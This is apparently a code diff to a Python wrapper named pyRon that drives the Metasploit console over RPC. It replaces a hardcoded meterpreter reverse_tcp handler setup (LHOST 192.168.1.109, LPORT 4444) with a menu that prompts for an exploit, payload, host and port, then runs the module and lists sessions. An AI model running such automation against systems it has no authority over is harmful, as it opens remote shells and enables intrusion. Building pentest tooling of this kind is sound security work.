@@ -96,21 +96,37 @@ class pyRon:
         # Connect to msfrpcd
         if self.msfclient.connect() is False:
             sys.exit()
+        
+        self.mainMenu()
 
+    def execteSimpleExploit(self):
         # Testing sending commands to console to run
-        self.msfclient.console.write('use exploit/multi/handler')
+        # THIS WORKS FOR EXPLOITS but needs EXE to run
+        print ("USING EXPLOIT")
+        exploit = raw_input("Please enter exploit: ")
+        self.msfclient.console.write('use ' + exploit)
         time.sleep(2)
-        self.msfclient.console.write('use windows/meterpreter/reverse_tcp')
+        print ("SET PAYLOAD")
+        payload = raw_input("Please enter payload: ")
+        self.msfclient.console.write('set payload ' + payload)
         time.sleep(2)
-        self.msfclient.console.write('set LHOST 192.168.1.109')
+        print("SET LHOST")
+        host = str(raw_input("Please enter LHOST: "))
+        self.msfclient.console.write('set LHOST ' + host)
         time.sleep(2)
-        self.msfclient.console.write('set LPORT 4444')
+        print("SET LPORT")
+        port = str(raw_input("Please enter LPORT: "))
+        self.msfclient.console.write('set LPORT ' + port)
         time.sleep(2)
-        self.msfclient.console.write('set THREADS 20')
+        print("SET THREAD")
+        thread = str(raw_input("Please enter number of threads: "))
+        self.msfclient.console.write('set THREADS ' + thread)
         time.sleep(2)
+        print("RUNNING")
         self.msfclient.console.write('run')
         time.sleep(10)
-
+    
+    def printSessions(self):
         # Only works if you load msgrpc with the correct parameters using the framework
         # Params: Pass=password, default port is 55552
         self.sessions = self.msfclient.client.sessions.list
@@ -119,6 +135,25 @@ class pyRon:
             
             for key in s_info:
                 print(key + ':', s_info[key])
+
+    def mainMenu(self):
+        menuGoing = False
+        print("[+] Console Running and Connected!\n")
+        print("[!] Entering Main Menu\n")
+        while menuGoing == False:
+            print("\n[***]Main Menu[***]\n")
+            print("1.) Start Exploit and Payload")
+            print("2.) Print Current Session")
+            print("press 0 to exit...")
+            selection = input("[!] Please select an option: ")
+            if selection == 1:
+                self.execteSimpleExploit()
+            if selection == 2:
+                self.printSessions()
+            if selection == 0:
+                print("[!!] Exiting...")
+                self.msfclient.console.destroy()
+                return True
 
 # Execute Main
 try:
